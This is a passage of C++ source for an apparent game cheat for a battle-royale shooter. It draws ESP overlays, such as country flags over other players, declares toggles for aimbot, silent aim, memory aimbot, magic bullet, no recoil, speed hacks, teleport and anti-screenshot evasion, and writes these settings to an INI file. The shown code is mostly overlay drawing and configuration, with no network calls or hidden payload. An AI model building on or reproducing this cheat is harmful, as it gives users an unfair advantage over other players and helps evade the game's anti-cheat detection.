		DX11::ImGui_DX11::DrawImage(DX11::UZFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "VU")
	{
		DX11::ImGui_DX11::DrawImage(DX11::VUFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "VE")
	{
		DX11::ImGui_DX11::DrawImage(DX11::VEFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "VN")
	{
		DX11::ImGui_DX11::DrawImage(DX11::VNFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "VG")
	{
		DX11::ImGui_DX11::DrawImage(DX11::VGFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "VI")
	{
		DX11::ImGui_DX11::DrawImage(DX11::VIFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "WF")
	{
		DX11::ImGui_DX11::DrawImage(DX11::WFFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "EH")
	{
		DX11::ImGui_DX11::DrawImage(DX11::EHFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "YE")
	{
		DX11::ImGui_DX11::DrawImage(DX11::YEFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "ZM")
	{
		DX11::ImGui_DX11::DrawImage(DX11::ZMFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "ZW")
	{
		DX11::ImGui_DX11::DrawImage(DX11::ZWFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "AX")
	{
		DX11::ImGui_DX11::DrawImage(DX11::AXFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "IS")
	{
		DX11::ImGui_DX11::DrawImage(DX11::ISFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "IN")
	{
		DX11::ImGui_DX11::DrawImage(DX11::INFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "ID")
	{
		DX11::ImGui_DX11::DrawImage(DX11::IDFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "IR")
	{
		DX11::ImGui_DX11::DrawImage(DX11::IRFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "IQ")
	{
		DX11::ImGui_DX11::DrawImage(DX11::IQFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "IE")
	{
		DX11::ImGui_DX11::DrawImage(DX11::IEFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "IM")
	{
		DX11::ImGui_DX11::DrawImage(DX11::IMFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "IL")
	{
		DX11::ImGui_DX11::DrawImage(DX11::ILFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
	if (AActor.Nation == "IT")
	{
		DX11::ImGui_DX11::DrawImage(DX11::ITFLAG, Screen.X - PosX, Screen.Y - PosY, X, Y);
	}
}

///Settings
static int pweapsize = 12;
static int bweapsize = 12;
static int weapsize = 12;
static int TeamIdSize = 12;
static int BotTeamIdSize = 12;
static int nsize = 14;
static int botnsize = 14;
static int skelee = 0;
static int bskelee = 0;
static int MAgiclinee = 0;
static int dotsstyle = 1;
static int VehicleStyle = 0;
static int WeaponStyle = 1;
static int bWeaponStyle = 0;
static int NameBgStyle = 0;
static int FlagStyle = 0;
static int bFlagStyle = 0;
static int ITEMSELECTIONN = 0;
static int ITEMSELECTIONNIMG = 0;
static int healthBarWidth = 70;
static int namebgBarWidth = 100;
static int healthBarhight = 20;
static int healthBary = 10;
static int healthBarx = 50;
static int linne = 0;
static int blinne = 0;
static int hpbt = 0;
static int boxe = 0;
static int bboxe = 0;
static int lineTop = 0;
static int boxver1 = 0;
static int bboxver1 = 0;
static int boxcolorver = 0;
static int bboxcolorver = 0;
static int aimbp = 0;
static int dissize = 12;
static int botdissize = 12;
static int pnamesize = 12;
static int pweapone = 12;
static int bpweapone = 12;
static int aimwarning = 15;
static int hp = 12;
static int vehisize = 12;
static int Font = 0;
static int TotalEnemyStyle = 0;
static int TeamIDStyle = 0;
static int bTeamIDStyle = 0;
bool marco1 = false;
bool ArSkins1 = false;
bool nothingm = true;
bool nothinga = false;
static int RRR = 3;
int vehbarsize = 80;

static int tabss = 0;
int iconscircle = 20;
int vehbgsize = 20;
int ypos = -29;
int xpos = -49;
float bgcolor[4] = { 1.000f, 1.000f, 1.000f, 0.350f };
float vehbgcolor[4] = { 1.000f, 1.000f, 1.000f, 0.350f };
bool hideKey = true;
bool LoadSetting = false;
bool SaveSetting = false;
bool SilentAim1 = false;
bool Aimbot1 = false;
bool IpadView1 = false;
bool instanthit1 = false;
bool CameraCatch1 = false;
bool CameraAimBot1 = false;
bool ForceTPP1 = false;
bool FastWeponSwith1 = false;
bool ScopeZoom1 = false;
bool godView1 = false;
bool XEffect1 = true;
bool recoil1 = false;
bool speedcar1 = false;
bool fastShoot1 = false;
bool ShowDaamge1 = false;
bool Quickloot1 = false;
bool ShowSideMenu1 = false;
bool TotalEnemy1 = false;
bool gameinfo1 = false;
bool SnowFlake11 = false;
bool wwcd1 = false;
bool AntiScreenShot1 = false;
///////////////////////////
bool magicrange11 = false;
bool fovcircle1 = false;
bool InVisbleFov1 = false;
bool SkipKnocked1 = false;
bool SkipBots1 = false;
bool AimLineCross1 = false;
bool TEXTONMAIN1 = false;
float BotXPos = 19;
float BotYPos = 27;
float YY = 150;
float YYY = 138;
float YYYY = 323;
float YYYYY = 415;
float XX = 33;
float XXX = 20;
float XXXX = 20;
float XXXXX = 20;
float fround(float var)
{
	float value = (int)(var * 100 + .5);
	return (float)value / 100;
}
bool WriteConfigurate(std::string Path)
{
	CSimpleIniA ini;
	ini.SetUnicode();
	SI_Error rc = ini.LoadFile(Path.c_str());
	if (rc < 0) { std::cout << "File not found"; };


	////////////PLAYER ////////////////	

	ini.SetLongValue("pbonesize", "pbonesize", Setting::pbonesize);
	ini.SetLongValue("plyrbox", "plyrbox", Setting::plyrbox);
	ini.SetLongValue("nsize", "nsize", nsize);
	ini.SetLongValue("botnsize", "botnsize", botnsize);
	ini.SetLongValue("TeamIdSize", "TeamIdSize", TeamIdSize);
	ini.SetLongValue("BotTeamIdSize", "BotTeamIdSize", BotTeamIdSize);
	ini.SetLongValue("botnsize", "botnsize", botnsize);
	ini.SetLongValue("blinesize", "blinesize", Setting::blinesize);
	ini.SetLongValue("bbonesize", "bbonesize", Setting::bbonesize);
	ini.SetLongValue("bcornersize", "bcornersize", Setting::bcornersize);
	ini.SetLongValue("pbonesize", "pbonesize", Setting::pbonesize);
	ini.SetLongValue("dissize", "dissize", dissize);
	ini.SetLongValue("botdissize", "botdissize", botdissize);
	ini.SetLongValue("bfullboxsize", "bfullboxsize", Setting::bfullboxsize);
	ini.SetLongValue("DotsRadius", "DotsRadius", Setting::DotsRadius);
	ini.SetLongValue("DotsRange", "DotsRange", Setting::DotsRange);
	ini.SetLongValue("FlagStyle", "FlagStyle", FlagStyle);
	ini.SetLongValue("EspStyle", "EspStyle", Setting::EspStyle);
	ini.SetLongValue("BotEspStyle", "BotEspStyle", Setting::BotEspStyle);
	ini.SetBoolValue("Enabled", "Enabled", Setting::Aimbot);
	ini.SetLongValue("Aimspeed", "Aimspeed", Setting::Aimspeed);
	ini.SetLongValue("plinesize", "plinesize", Setting::plinesize);
	ini.SetBoolValue("Enabled", "Enabled", Setting::AttachOnVisible);
	ini.SetLongValue("AimbotKey", "Value", Setting::AimbotKey);
	ini.SetLongValue("AimSwichKey", "Value", Setting::AimSwichKey);
	ini.SetBoolValue("MemoryAimbot", "MemoryAimbot", Setting::MemoryAimbot);

	ini.SetLongValue("nsize", "nsize", nsize);
	ini.SetBoolValue("Enabled", "Enabled", Setting::VisibleCheck);
	ini.SetBoolValue("Enabled", "Enabled", Setting::pname);
	ini.SetBoolValue("Enabled", "Enabled", Setting::pflag);
	ini.SetBoolValue("Enabled", "Enabled", Setting::playerweapon);
	ini.SetBoolValue("Enabled", "Enabled", Setting::pTeamID);

	ini.SetBoolValue("botname", "botname", Setting::botname);
	ini.SetBoolValue("botweapon", "botweapon", Setting::botweapon);
	ini.SetBoolValue("botflag", "botflag", Setting::botflag);
	ini.SetBoolValue("botTeamID", "botTeamID", Setting::botTeamID);
	ini.SetBoolValue("botline", "botline", Setting::botline);
	ini.SetBoolValue("botBone", "botBone", Setting::botBone);
	ini.SetBoolValue("botcorner", "botcorner", Setting::botcorner);
	ini.SetBoolValue("botdistance", "botdistance", Setting::botdistance);
	ini.SetBoolValue("bothealth", "bothealth", Setting::bothealth);
	ini.SetBoolValue("Enabled", "Enabled", Setting::Aimbot);


	ini.SetBoolValue("Enabled", "Enabled", Setting::Macro);
	ini.SetBoolValue("Enabled", "Enabled", Setting::micro_Iron);
	ini.SetBoolValue("Enabled", "Enabled", Setting::micro_RedDot);
	ini.SetBoolValue("Enabled", "Enabled", Setting::micro_X2);
	ini.SetBoolValue("Enabled", "Enabled", Setting::micro_X3);
	ini.SetBoolValue("Enabled", "Enabled", Setting::micro_X4);
	ini.SetBoolValue("Enabled", "Enabled", Setting::micro_X6);

	ini.SetLongValue("microaxis_Iron.Y", "microaxis_Iron.Y", Setting::microaxis_Iron.Y);
	ini.SetLongValue("microaxis_RedDot.Y", "microaxis_RedDot.Y", Setting::microaxis_RedDot.Y);
	ini.SetLongValue("microaxis_X2.Y", "microaxis_X2.Y", Setting::microaxis_X2.Y);
	ini.SetLongValue("microaxis_X3.Y", "microaxis_X3.Y", Setting::microaxis_X3.Y);
	ini.SetLongValue("microaxis_X4.Y", "microaxis_X4.Y", Setting::microaxis_X4.Y);
	ini.SetLongValue("microaxis_X6.Y", "microaxis_X6.Y", Setting::microaxis_X6.Y);

	ini.SetBoolValue("Enabled", "Enabled", Setting::fastpara);
	ini.SetBoolValue("Enabled", "Enabled", Setting::damagebeast);
	ini.SetBoolValue("Enabled", "Enabled", Setting::isSpinning);
	ini.SetBoolValue("Enabled", "Enabled", Setting::WeaponScale);
	ini.SetBoolValue("Enabled", "Enabled", Setting::HDR);
	ini.SetBoolValue("Enabled", "Enabled", Setting::FPS);

	ini.SetLongValue("FPSVALUE", "FPSVALUE", Setting::FPSVALUE);
	ini.SetLongValue("SpiningKeys", "SpiningKeys", Setting::SpiningKeys);
	ini.SetLongValue("PlayerSpining", "PlayerSpining", Setting::PlayerSpining);
	ini.SetLongValue("WeaponScaleValue", "WeaponScaleValue", Setting::WeaponScaleValue);
	ini.SetLongValue("fastparaaa", "fastparaaa", Setting::fastparaaa);
	ini.SetLongValue("Magic_Bullet", "Magic_Bullet", Setting::Magic_Bullet);
	ini.SetLongValue("fastparakey", "fastparakey", Setting::fastparakey);
	ini.SetBoolValue("paraassists", "paraassists", Setting::paraassists);

	ini.SetBoolValue("blacksky", "blacksky", Setting::blacksky);
	ini.SetBoolValue("carteleport", "carteleport", Setting::carteleport);
	ini.SetBoolValue("GodView", "GodView", Setting::GodView);
	ini.SetBoolValue("highjump", "highjump", Setting::highjump);

	ini.SetLongValue("Fastcarkey", "Fastcarkey", Setting::Fastcarkey);
	ini.SetLongValue("Backcarkey", "Backcarkey", Setting::Backcarkey);

	ini.SetLongValue("fastrv_3", "fastrv_3", Setting::fastrv_3);
	ini.SetBoolValue("fastrun3", "fastrun3", Setting::fastrun3);

	ini.SetLongValue("RecSelector", "Value", Setting::RecSelector);
	ini.SetLongValue("RecSelector2", "Value", Setting::RecSelector2);

	ini.SetLongValue("fastrunkey2", "fastrunkey2", Setting::fastrunkey2);


	ini.SetLongValue("vahicle_Text_item_Dacia_TextSize", "vahicle_Text_item_Dacia_TextSize", Setting::vahicle_Text_item_Dacia_TextSize);
	ini.SetLongValue("vahicle_Text_item_UAZ_TextSize", "vahicle_Text_item_UAZ_TextSize", Setting::vahicle_Text_item_UAZ_TextSize);
	ini.SetLongValue("vahicle_Text_item_Coupe_TextSize", "vahicle_Text_item_Coupe_TextSize", Setting::vahicle_Text_item_Coupe_TextSize);
	ini.SetLongValue("vahicle_Text_item_UTV_TextSize", "vahicle_Text_item_UTV_TextSize", Setting::vahicle_Text_item_UTV_TextSize);
	ini.SetLongValue("vahicle_Text_item_Buggy_TextSize", "vahicle_Text_item_Buggy_TextSize", Setting::vahicle_Text_item_Buggy_TextSize);
	ini.SetLongValue("vahicle_Text_item_BRDM_TextSize", "vahicle_Text_item_BRDM_TextSize", Setting::vahicle_Text_item_BRDM_TextSize);
	ini.SetLongValue("vahicle_Text_item_Motorcycle_TextSize", "vahicle_Text_item_Motorcycle_TextSize", Setting::vahicle_Text_item_Motorcycle_TextSize);
	ini.SetLongValue("vahicle_Text_item_SnowBike_TextSize", "vahicle_Text_item_SnowBike_TextSize", Setting::vahicle_Text_item_SnowBike_TextSize);
	ini.SetLongValue("vahicle_Text_item_Sports_TextSize", "vahicle_Text_item_Sports_TextSize", Setting::vahicle_Text_item_Sports_TextSize);
	ini.SetLongValue("vahicle_Text_item_Minibus_TextSize", "vahicle_Text_item_Minibus_TextSize", Setting::vahicle_Text_item_Minibus_TextSize);
	ini.SetLongValue("vahicle_Text_item_Bike_TextSize", "vahicle_Text_item_Bike_TextSize", Setting::vahicle_Text_item_Bike_TextSize);
	ini.SetLongValue("vahicle_Text_item_BigFoot_TextSize", "vahicle_Text_item_BigFoot_TextSize", Setting::vahicle_Text_item_BigFoot_TextSize);
	ini.SetLongValue("vahicle_Text_item_Aquarail_TextSize", "vahicle_Text_item_Aquarail_TextSize", Setting::vahicle_Text_item_Aquarail_TextSize);
	ini.SetLongValue("vahicle_Text_item_PG117_TextSize", "vahicle_Text_item_PG117_TextSize", Setting::vahicle_Text_item_PG117_TextSize);
	ini.SetLongValue("vahicle_Text_item_Rony_TextSize", "vahicle_Text_item_Rony_TextSize", Setting::vahicle_Text_item_Rony_TextSize);
	ini.SetLongValue("vahicle_Text_item_Plane_TextSize", "vahicle_Text_item_Plane_TextSize", Setting::vahicle_Text_item_Plane_TextSize);
	ini.SetLongValue("vahicle_Text_item_PickUpTruck_TextSize", "vahicle_Text_item_PickUpTruck_TextSize", Setting::vahicle_Text_item_PickUpTruck_TextSize);
	ini.SetLongValue("vahicle_Text_item_ATV2_TextSize", "vahicle_Text_item_ATV2_TextSize", Setting::vahicle_Text_item_ATV2_TextSize);
	ini.SetLongValue("vahicle_Text_item_Tuk_TextSize", "vahicle_Text_item_Tuk_TextSize", Setting::vahicle_Text_item_Tuk_TextSize);




	ini.SetLongValue("Esp_Item_M416_TextSize", "Esp_Item_M416_TextSize", Setting::Esp_Item_M416_TextSize);
	ini.SetLongValue("Esp_Item_AKM_TextSize", "Esp_Item_AKM_TextSize", Setting::Esp_Item_AKM_TextSize);
	ini.SetLongValue("Esp_Item_M762_TextSize", "Esp_Item_M762_TextSize", Setting::Esp_Item_M762_TextSize);
	ini.SetLongValue("Esp_Item_SCARL_TextSize", "Esp_Item_SCARL_TextSize", Setting::Esp_Item_SCARL_TextSize);
	ini.SetLongValue("Esp_Item_M16A4_TextSize", "Esp_Item_M16A4_TextSize", Setting::Esp_Item_M16A4_TextSize);
	ini.SetLongValue("Esp_Item_G36C_TextSize", "Esp_Item_G36C_TextSize", Setting::Esp_Item_G36C_TextSize);
	ini.SetLongValue("Esp_Item_QBZ_TextSize", "Esp_Item_QBZ_TextSize", Setting::Esp_Item_QBZ_TextSize);
	ini.SetLongValue("Esp_Item_Mk47Mutant_TextSize", "Esp_Item_Mk47Mutant_TextSize", Setting::Esp_Item_Mk47Mutant_TextSize);
	ini.SetLongValue("Esp_Item_FAMAS_TextSize", "Esp_Item_FAMAS_TextSize", Setting::Esp_Item_FAMAS_TextSize);
	ini.SetLongValue("Esp_Item_M24_TextSize", "Esp_Item_M24_TextSize", Setting::Esp_Item_M24_TextSize);
	ini.SetLongValue("Esp_Item_Kar98k_TextSize", "Esp_Item_Kar98k_TextSize", Setting::Esp_Item_Kar98k_TextSize);
	ini.SetLongValue("Esp_Item_Awm_TextSize", "Esp_Item_Awm_TextSize", Setting::Esp_Item_Awm_TextSize);
	ini.SetLongValue("Esp_Item_QBU_TextSize", "Esp_Item_QBU_TextSize", Setting::Esp_Item_QBU_TextSize);
	ini.SetLongValue("Esp_Item_SLR_TextSize", "Esp_Item_SLR_TextSize", Setting::Esp_Item_SLR_TextSize);
	ini.SetLongValue("Esp_Item_SKS_TextSize", "Esp_Item_SKS_TextSize", Setting::Esp_Item_SKS_TextSize);
	ini.SetLongValue("Esp_Item_Mk12_TextSize", "Esp_Item_Mk12_TextSize", Setting::Esp_Item_Mk12_TextSize);
	ini.SetLongValue("Esp_Item_Mini14_TextSize", "Esp_Item_Mini14_TextSize", Setting::Esp_Item_Mini14_TextSize);
	ini.SetLongValue("Esp_Item_Mk14_TextSize", "Esp_Item_Mk14_TextSize", Setting::Esp_Item_Mk14_TextSize);
	ini.SetLongValue("Esp_Item_PP19_TextSize", "Esp_Item_PP19_TextSize", Setting::Esp_Item_PP19_TextSize);
	ini.SetLongValue("Esp_Item_TommyGun_TextSize", "Esp_Item_TommyGun_TextSize", Setting::Esp_Item_TommyGun_TextSize);
	ini.SetLongValue("Esp_Item_MP5K_TextSize", "Esp_Item_MP5K_TextSize", Setting::Esp_Item_MP5K_TextSize);
	ini.SetLongValue("Esp_Item_UMP9_TextSize", "Esp_Item_UMP9_TextSize", Setting::Esp_Item_UMP9_TextSize);
	ini.SetLongValue("Esp_Item_Vector_TextSize", "Esp_Item_Vector_TextSize", Setting::Esp_Item_Vector_TextSize);
	ini.SetLongValue("Esp_Item_Uzi_TextSize", "Esp_Item_Uzi_TextSize", Setting::Esp_Item_Uzi_TextSize);
	ini.SetLongValue("Esp_Item_S1897_TextSize", "Esp_Item_S1897_TextSize", Setting::Esp_Item_S1897_TextSize);
	ini.SetLongValue("Esp_Item_S686_TextSize", "Esp_Item_S686_TextSize", Setting::Esp_Item_S686_TextSize);
	ini.SetLongValue("Esp_Item_DBS_TextSize", "Esp_Item_DBS_TextSize", Setting::Esp_Item_DBS_TextSize);
	ini.SetLongValue("Esp_Item_S12K_TextSize", "Esp_Item_S12K_TextSize", Setting::Esp_Item_S12K_TextSize);
	ini.SetLongValue("Esp_Item_M1014_TextSize", "Esp_Item_M1014_TextSize", Setting::Esp_Item_M1014_TextSize);
	ini.SetLongValue("Esp_Item_DesertEagle_TextSize", "Esp_Item_DesertEagle_TextSize", Setting::Esp_Item_DesertEagle_TextSize);
	ini.SetLongValue("Esp_Item_P1911_TextSize", "Esp_Item_P1911_TextSize", Setting::Esp_Item_P1911_TextSize);
	ini.SetLongValue("Esp_Item_R45_TextSize", "Esp_Item_R45_TextSize", Setting::Esp_Item_R45_TextSize);
	ini.SetLongValue("Esp_Item_P18C_TextSize", "Esp_Item_P18C_TextSize", Setting::Esp_Item_P18C_TextSize);
	ini.SetLongValue("Esp_Item_P92_TextSize", "Esp_Item_P92_TextSize", Setting::Esp_Item_P92_TextSize);
	ini.SetLongValue("Esp_Item_FlareGun_TextSize", "Esp_Item_FlareGun_TextSize", Setting::Esp_Item_FlareGun_TextSize);
	ini.SetLongValue("Esp_Item_Lazer_TextSize", "Esp_Item_Lazer_TextSize", Setting::Esp_Item_Lazer_TextSize);
	ini.SetLongValue("Esp_Item_Holo_TextSize", "Esp_Item_Holo_TextSize", Setting::Esp_Item_Holo_TextSize);
	ini.SetLongValue("Esp_Item_x2_TextSize ", "Esp_Item_x2_TextSize", Setting::Esp_Item_x2_TextSize);
	ini.SetLongValue("Esp_Item_x3_TextSize", "Esp_Item_x3_TextSize", Setting::Esp_Item_x3_TextSize);
	ini.SetLongValue("Esp_Item_x4_TextSize", "Esp_Item_x4_TextSize", Setting::Esp_Item_x4_TextSize);
	ini.SetLongValue("Esp_Item_x6_TextSize", "Esp_Item_x6_TextSize", Setting::Esp_Item_x6_TextSize);
	ini.SetLongValue("Esp_Item_x8_TextSize", "Esp_Item_x8_TextSize", Setting::Esp_Item_x8_TextSize);
	ini.SetLongValue("Esp_Item_M249_TextSize", "Esp_Item_M249_TextSize", Setting::Esp_Item_M249_TextSize);
	ini.SetLongValue("Esp_Item_MG3_TextSize", "Esp_Item_MG3_TextSize", Setting::Esp_Item_MG3_TextSize);
	ini.SetLongValue("Esp_Item_DP28_TextSize", "Esp_Item_DP28_TextSize", Setting::Esp_Item_DP28_TextSize);
	ini.SetLongValue("Esp_Item_762mm_TextSize", "Esp_Item_762mm_TextSize", Setting::Esp_Item_762mm_TextSize);
	ini.SetLongValue("Esp_Item_556mm_TextSize", "Esp_Item_556mm_TextSize", Setting::Esp_Item_556mm_TextSize);
	ini.SetLongValue("Esp_Item_9mm_TextSize", "Esp_Item_9mm_TextSize", Setting::Esp_Item_9mm_TextSize);
	ini.SetLongValue("Esp_Item_45ACP_Icon", "Esp_Item_45ACP_Icon", Setting::Esp_Item_45ACP_Icon);
	ini.SetLongValue("Esp_Item_45ACP_TextSize", "Esp_Item_45ACP_TextSize", Setting::Esp_Item_45ACP_TextSize);
	ini.SetLongValue("Esp_Item_12Guage_TextSize", "Esp_Item_12Guage_TextSize", Setting::Esp_Item_12Guage_TextSize);
	ini.SetLongValue("Esp_Item_Bag1_TextSize", "Esp_Item_Bag1_TextSize", Setting::Esp_Item_Bag1_TextSize);
	ini.SetLongValue("Esp_Item_Bag2_TextSize", "Esp_Item_Bag2_TextSize", Setting::Esp_Item_Bag2_TextSize);
	ini.SetLongValue("Esp_Item_Bag3_TextSize", "Esp_Item_Bag3_TextSize", Setting::Esp_Item_Bag3_TextSize);
	ini.SetLongValue("Esp_Item_Armor1_TextSize", "Esp_Item_Armor1_TextSize", Setting::Esp_Item_Armor1_TextSize);
	ini.SetLongValue("Esp_Item_Armor2_TextSize", "Esp_Item_Armor2_TextSize", Setting::Esp_Item_Armor2_TextSize);
	ini.SetLongValue("Esp_Item_Armor3_TextSize", "Esp_Item_Armor3_TextSize", Setting::Esp_Item_Armor3_TextSize);
	ini.SetLongValue("Esp_Item_Helmet1_TextSize", "Esp_Item_Helmet1_TextSize", Setting::Esp_Item_Helmet1_TextSize);
	ini.SetLongValue("Esp_Item_Helmet2_TextSize", "Esp_Item_Helmet2_TextSize", Setting::Esp_Item_Helmet2_TextSize);
	ini.SetLongValue("Esp_Item_Helmet3_TextSize", "Esp_Item_Helmet3_TextSize", Setting::Esp_Item_Helmet3_TextSize);
	ini.SetLongValue("Esp_Item_Bandage_TextSize", "Esp_Item_Bandage_TextSize", Setting::Esp_Item_Bandage_TextSize);
	ini.SetLongValue("Esp_Item_MedKit_TextSize", "Esp_Item_MedKit_TextSize", Setting::Esp_Item_MedKit_TextSize);
	ini.SetLongValue("Esp_Item_FirstAidKit_TextSize", "Esp_Item_FirstAidKit_TextSize", Setting::Esp_Item_FirstAidKit_TextSize);
	ini.SetLongValue("Esp_Item_Painkiller_TextSize", "Esp_Item_Painkiller_TextSize", Setting::Esp_Item_Painkiller_TextSize);
	ini.SetLongValue("Esp_Item_EnergyDrink_TextSize", "Esp_Item_EnergyDrink_TextSize", Setting::Esp_Item_EnergyDrink_TextSize);
	ini.SetLongValue("Esp_Item_AdrenalineSyringe_TextSize", "Esp_Item_AdrenalineSyringe_TextSize", Setting::Esp_Item_AdrenalineSyringe_TextSize);
	ini.SetLongValue("Esp_Item_Frag_TextSize", "Esp_Item_Frag_TextSize", Setting::Esp_Item_Frag_TextSize);
	ini.SetLongValue("Esp_Item_Smoke_TextSize", "Esp_Item_Smoke_TextSize", Setting::Esp_Item_Smoke_TextSize);
	ini.SetLongValue("Esp_Item_Molotof_TextSize", "Esp_Item_Molotof_TextSize", Setting::Esp_Item_Molotof_TextSize);
	ini.SetLongValue("Esp_Item_Vertical_TextSize", "Esp_Item_Vertical_TextSize", Setting::Esp_Item_Vertical_TextSize);
	ini.SetLongValue("Esp_Item_HalfGrip_TextSize", "Esp_Item_HalfGrip_TextSize", Setting::Esp_Item_HalfGrip_TextSize);
	ini.SetLongValue("Esp_Item_Angled_TextSize", "Esp_Item_Angled_TextSize", Setting::Esp_Item_Angled_TextSize);
	ini.SetLongValue("Esp_Item_Lasersight_TextSize", "Esp_Item_Lasersight_TextSize", Setting::Esp_Item_Lasersight_TextSize);
	ini.SetLongValue("Esp_Item_ThumbGrip_TextSize", "Esp_Item_ThumbGrip_TextSize", Setting::Esp_Item_ThumbGrip_TextSize);
	ini.SetLongValue("Esp_Item_Large_FlashHider_TextSize", "Esp_Item_Large_FlashHider_TextSize", Setting::Esp_Item_Large_FlashHider_TextSize);
	ini.SetLongValue("Esp_Item_Large_Compensator_TextSize", "Esp_Item_Large_Compensator_TextSize", Setting::Esp_Item_Large_Compensator_TextSize);
	ini.SetLongValue("Esp_Item_Large_Suppressor_TextSize", "Esp_Item_Large_Suppressor_TextSize", Setting::Esp_Item_Large_Suppressor_TextSize);
	ini.SetLongValue("Esp_Item_Taktik_TextSize", "Esp_Item_Taktik_TextSize", Setting::Esp_Item_Taktik_TextSize);
	ini.SetLongValue("Esp_Item_AR_Quick_TextSize", "Esp_Item_AR_Quick_TextSize", Setting::Esp_Item_AR_Quick_TextSize);
	ini.SetLongValue("Esp_Item_AR_Quick_Extended_TextSize", "Esp_Item_AR_Quick_Extended_TextSize", Setting::Esp_Item_AR_Quick_Extended_TextSize);
	ini.SetLongValue("Esp_Item_AR_Extended_TextSize", "Esp_Item_AR_Extended_TextSize", Setting::Esp_Item_AR_Extended_TextSize);
	ini.SetLongValue("Esp_Item_Sniper_FlashHider_TextSize", "Esp_Item_Sniper_FlashHider_TextSize", Setting::Esp_Item_Sniper_FlashHider_TextSize);
	ini.SetLongValue("Esp_Item_Sniper_Suppressor_TextSize", "Esp_Item_Sniper_Suppressor_TextSize", Setting::Esp_Item_Sniper_Suppressor_TextSize);
	ini.SetLongValue("Esp_Item_Sniper_Quick_Extended_TextSize", "Esp_Item_Sniper_Quick_Extended_TextSize", Setting::Esp_Item_Sniper_Quick_Extended_TextSize);
	ini.SetLongValue("Esp_Item_Sniper_Extended_TextSize", "Esp_Item_Sniper_Extended_TextSize", Setting::Esp_Item_Sniper_Extended_TextSize);
	ini.SetLongValue("Esp_Item_Sniper_Quick_TextSize", "Esp_Item_Sniper_Quick_TextSize", Setting::Esp_Item_Sniper_Quick_TextSize);
	ini.SetLongValue("Esp_Item_Mid_FlashHider_TextSize", "Esp_Item_Mid_FlashHider_TextSize", Setting::Esp_Item_Mid_FlashHider_TextSize);
	ini.SetLongValue("Esp_Item_Mid_Suppressor_TextSize", "Esp_Item_Mid_Suppressor_TextSize", Setting::Esp_Item_Mid_Suppressor_TextSize);
	ini.SetLongValue("Esp_Item_Mid_Compensator_TextSize", "Esp_Item_Mid_Compensator_TextSize", Setting::Esp_Item_Mid_Compensator_TextSize);
	ini.SetLongValue("Esp_Item_Micro_UZI_TextSize", "Esp_Item_Micro_UZI_TextSize", Setting::Esp_Item_Micro_UZI_TextSize);
	ini.SetLongValue("Esp_Item_SMG_Quick_Extended_TextSize", "Esp_Item_SMG_Quick_Extended_TextSize   ", Setting::Esp_Item_SMG_Quick_Extended_TextSize);
	ini.SetLongValue("Esp_Item_SMG_Quick_TextSize", "Esp_Item_SMG_Quick_TextSize", Setting::Esp_Item_SMG_Quick_TextSize);
	ini.SetLongValue("Esp_Item_SMG_Extended_TextSize", "Esp_Item_SMG_Extended_TextSize", Setting::Esp_Item_SMG_Extended_TextSize);
	ini.SetLongValue("Esp_Item_DeadBox_TextSize", "Esp_Item_DeadBox_TextSize", Setting::Esp_Item_DeadBox_TextSize);
	ini.SetLongValue("Esp_Item_AirDrop_TextSize", "Esp_Item_AirDrop_TextSize", Setting::Esp_Item_AirDrop_TextSize);
	ini.SetLongValue("Esp_Item_GameCoin_TextSize", "Esp_Item_GameCoin_TextSize", Setting::Esp_Item_GameCoin_TextSize);
	ini.SetLongValue("Esp_Item_Benzin_TextSize", "Esp_Item_Benzin_TextSize", Setting::Esp_Item_Benzin_TextSize);
	ini.SetLongValue("Esp_Item_CrossBow_TextSize", "Esp_Item_CrossBow_TextSize", Setting::Esp_Item_CrossBow_TextSize);



	ini.SetLongValue("botBoneColorVer", "Value", Setting::botBoneColorVer);
	ini.SetLongValue("botlineColorVer", "Value", Setting::botlineColorVer);
	ini.SetLongValue("playerBoneColorVer", "Value", Setting::playerBoneColorVer);
	ini.SetLongValue("plineColorVer", "Value", Setting::plineColorVer);
	ini.SetLongValue("skelee", "Value", skelee);
	ini.SetLongValue("botnsize", "Value", botnsize);
	ini.SetLongValue("weapsize", "Value", weapsize);
	ini.SetLongValue("pweapsize", "Value", pweapsize);
	ini.SetLongValue("linne", "Value", linne);
	ini.SetLongValue("boxe", "Value", boxe);
	ini.SetLongValue("boxver1", "Value", boxver1);
	ini.SetLongValue("boxcolorver", "Value", boxcolorver);
	ini.SetLongValue("TeamIDStyle", "Value", TeamIDStyle);
	ini.SetLongValue("WeaponStyle", "Value", WeaponStyle);
	ini.SetLongValue("FlagStyle", "Value", FlagStyle);

	ini.SetLongValue("bskelee", "Value", bskelee);
	ini.SetLongValue("botnsize", "Value", botnsize);
	ini.SetLongValue("bweapsize", "Value", bweapsize);
	ini.SetLongValue("bpweapsize", "Value", bweapsize);
	ini.SetLongValue("blinne", "Value", blinne);
	ini.SetLongValue("bboxe", "Value", bboxe);
	ini.SetLongValue("bboxver1", "Value", bboxver1);
